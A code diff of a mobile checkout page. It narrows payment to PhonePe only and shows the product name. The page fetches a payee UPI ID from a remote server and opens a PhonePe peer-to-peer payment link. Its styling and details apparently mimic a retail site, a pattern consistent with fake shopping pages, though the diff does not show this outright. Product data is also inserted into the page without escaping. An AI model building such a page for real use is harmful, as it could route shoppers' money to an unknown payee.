@@ -18,15 +18,19 @@ body{ margin:0; background:#f1f3f6 }
 
 .card{ background:#fff; border-radius:8px; margin:8px; padding:12px;
   box-shadow:0 1px 3px rgba(0,0,0,.08)}
+
 .product-row{ display:flex; gap:12px; align-items:center }
 .product-img{ width:70px; height:70px; border:1px solid #eee;
   border-radius:6px; object-fit:contain }
+.product-info{ flex:1 }
+.product-name{ font-size:14px; font-weight:bold; margin-bottom:6px }
+.product-price{ color:#000 }
 
 .pay-option{ display:flex; align-items:center; gap:12px;
-  padding:12px; border:2px solid #ddd; border-radius:8px;
-  margin-bottom:10px; cursor:pointer }
+  padding:12px; border:2px solid #2874f0; border-radius:8px;
+  background:#f0f7ff }
+
 .pay-option img{ width:28px }
-.pay-option.selected{ border-color:#2874f0; background:#f0f7ff }
 
 .price-row{ display:flex; justify-content:space-between; margin:6px 0 }
 
@@ -51,24 +55,18 @@ body{ margin:0; background:#f1f3f6 }
 </div>
 <div class="header-space"></div>
 
+<!-- PRODUCT CARD -->
 <div class="card" id="productCard">Loading product...</div>
 
+<!-- PAYMENT METHOD -->
 <div class="card">
   <h4>Select Payment Method</h4>
-
-  <div class="pay-option selected" data-method="phonepe">
+  <div class="pay-option">
     <img src="assets/images/phonepe-logo.webp"> PhonePe
-  </div>
-
-  <div class="pay-option" data-method="paytm">
-    <img src="assets/images/paytm.png"> Paytm
-  </div>
-
-  <div class="pay-option" data-method="gpay">
-    <img src="assets/images/gpay.webp"> Google Pay
   </div>
 </div>
 
+<!-- PRICE DETAILS -->
 <div class="card">
   <h4>Price Details (Reference Only)</h4>
   <div class="price-row"><span>Price</span><span id="price">₹--</span></div>
@@ -79,9 +77,10 @@ body{ margin:0; background:#f1f3f6 }
 
 <div style="height:90px"></div>
 
+<!-- PAY BUTTON -->
 <div class="bottom-bar">
   <b id="bottomAmount">₹--</b>
-  <button class="btn" id="payButton" disabled>Pay via UPI</button>
+  <button class="btn" id="payButton" disabled>Pay with PhonePe</button>
 </div>
 
 <script>
@@ -91,7 +90,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const UPI_API = "https://flipback-production.up.railway.app/api/upi";
 
   const payButton = document.getElementById("payButton");
-  let selectedMethod = "phonepe";
   let productPrice = 0;
   let upiId = "";
 
@@ -119,67 +117,60 @@ document.addEventListener('DOMContentLoaded', () => {
     return `phonepe://native?data=${btoa(JSON.stringify(data))}&id=p2ppayment`;
   }
 
-  function createUPIUrl(app){
-    return `${app}://upi/pay?pa=${upiId}&am=${productPrice}&cu=INR&tn=Payment`;
-  }
-
-  // payment method select
-  document.querySelectorAll(".pay-option").forEach(el=>{
-    el.onclick = ()=>{
-      document.querySelectorAll(".pay-option").forEach(x=>x.classList.remove("selected"));
-      el.classList.add("selected");
-      selectedMethod = el.dataset.method;
-    };
-  });
-
   payButton.onclick = () => {
 
     if(!isMobileDevice()){
       payButton.textContent = "Use Mobile Device";
-      setTimeout(()=>payButton.textContent="Pay via UPI",1500);
+      setTimeout(()=>payButton.textContent="Pay with PhonePe",1500);
       return;
     }
 
     payButton.disabled = true;
     payButton.classList.add("processing");
-    payButton.textContent = "Opening App...";
+    payButton.textContent = "Opening PhonePe...";
 
-    let url = "";
-    if(selectedMethod === "phonepe") url = createPhonePeUrl();
-    if(selectedMethod === "paytm") url = createUPIUrl("paytmmp");
-    if(selectedMethod === "gpay") url = createUPIUrl("tez");
-
-    window.location.href = url;
+    window.location.href = createPhonePeUrl();
 
     setTimeout(()=>{
       payButton.disabled = false;
       payButton.classList.remove("processing");
-      payButton.textContent = "Pay via UPI";
+      payButton.textContent = "Pay with PhonePe";
     },1500);
   };
 
-  // load UPI
-  fetch(UPI_API).then(r=>r.json()).then(d=>{
-    upiId = d?.data?.upi_id || d?.upi_id || "";
-  });
+  // Fetch UPI
+  fetch(UPI_API)
+    .then(r=>r.json())
+    .then(d=>{
+      upiId = d?.data?.upi_id || d?.upi_id || "";
+    });
 
-  // load product
-  fetch(PRODUCTS_API).then(r=>r.json()).then(d=>{
-    const p = d.data.find(x=>String(x.id)===qs("id") || String(x._id)===qs("id"));
-    productPrice = Number(p.discounted_price || p.price || 0);
+  // Load Product
+  fetch(PRODUCTS_API)
+    .then(r=>r.json())
+    .then(d=>{
+      const p = d.data.find(x =>
+        String(x.id) === qs("id") || String(x._id) === qs("id")
+      );
 
-    productCard.innerHTML = `
-      <div class="product-row">
-        <img src="${p.main_image || p.image}" class="product-img">
-        <div>₹${productPrice}</div>
-      </div>`;
+      productPrice = Number(p.discounted_price || p.price || 0);
+      const productName = p.name || p.title || "Product";
 
-    price.innerText =
-    total.innerText =
-    bottomAmount.innerText = "₹"+productPrice;
+      productCard.innerHTML = `
+        <div class="product-row">
+          <img src="${p.main_image || p.image}" class="product-img">
+          <div class="product-info">
+            <div class="product-name">${productName}</div>
+            <div class="product-price">₹${productPrice}</div>
+          </div>
+        </div>`;
 
-    payButton.disabled = false;
-  });
+      price.innerText =
+      total.innerText =
+      bottomAmount.innerText = "₹" + productPrice;
+
+      payButton.disabled = false;
+    });
 
 });
 </script>
